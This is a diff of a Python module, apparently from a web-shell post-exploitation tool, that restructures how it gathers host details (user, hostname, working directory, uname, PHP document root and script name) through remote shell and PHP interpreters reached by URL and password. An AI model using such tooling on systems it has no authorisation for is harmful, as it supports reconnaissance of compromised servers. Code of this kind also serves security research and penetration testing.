@@ -10,27 +10,34 @@ classname = 'Info'
     
 class Info(Module):
     """Collect system shell informations
-    system.info all|whoami|hostname|basedir|doc_root
+    system.info all|whoami|hostname|basedir|document_root
     """
     
-    shell_vectors = { "whoami"       : "whoami",
+    vectors = { 
+               'shell.sh' : { "whoami"       : "whoami",
                 "hostname"     : "hostname",
-                "basedir"   : "pwd"
-                }
+                "basedir"   : "pwd",
+                "uname"     : "uname -a",
+                "os"    : "uname"
+                },
+               
+               'shell.php' : { 
+                              "document_root" : "print($_SERVER['DOCUMENT_ROOT']);",
+                              "whoami" : "print(get_current_user());",
+                              "hostname" : "print(gethostname());",
+                              "basedir" : "print(getcwd());",
+                              "uname" : "print(php_uname());",
+                              "os" : "print(PHP_OS);",
+                              "script" : "print($_SERVER['SCRIPT_NAME']);"
+                              }
     
-    php_vectors = {
-                   "doc_root" : "print($_SERVER['DOCUMENT_ROOT']);"
     }
     
 
-    def __init__( self, moddict , url, password):
+    def __init__( self, modhandler , url, password):
 
 
-        Module.__init__(self, moddict, url, password)
-        
-        moddict.load('system.exec', url, password)
-        
-        self.loaded = True
+        Module.__init__(self, modhandler, url, password)
         
         self.infos = {}
         
@@ -40,25 +47,25 @@ class Info(Module):
         
         if info == 'all':
             
-            for info in self.shell_vectors:
-                self.infos[info] = self.moddict['system.exec'].run(self.shell_vectors[info])
+            for interpreter in self.vectors:
+                for vector in self.vectors[interpreter]:
+                    if interpreter in self.modhandler.loaded_shells and not (vector in self.infos):
+                        self.infos[vector] = self.modhandler.load(interpreter).run(self.vectors[interpreter][vector])
                 
-            for info in self.php_vectors:
-                self.infos[info] = self.moddict['php.exec'].run(self.php_vectors[info])
-                
+            output=''
+            for info in self.infos:
+                output += '%s:\n\t\t%s\n' % (info, self.infos[info])
+            return output
         
-        elif info in self.shell_vectors or info in self.php_vectors:
-            if info in self.infos:
-                return self.infos[info]
-            else:
-                if info in self.shell_vectors:
-                    return self.moddict['system.exec'].run(self.shell_vectors[info])
-                if info in self.php_vectors:
-                    return self.moddict['php.exec'].run(self.php_vectors[info])
-                    
-            
         else:
-            raise ModuleException("system.info",  "Information '%s' not supported." % (info))
+            
+            for interpreter in self.vectors:
+                for vector in self.vectors[interpreter]:
+                    if vector == info and interpreter in self.modhandler.loaded_shells and not vector in self.infos:
+                        return self.modhandler.load(interpreter).run(self.vectors[interpreter][vector])
+        
+         
+        raise ModuleException("system.info",  "Information '%s' not supported." % (info))
         
 
 
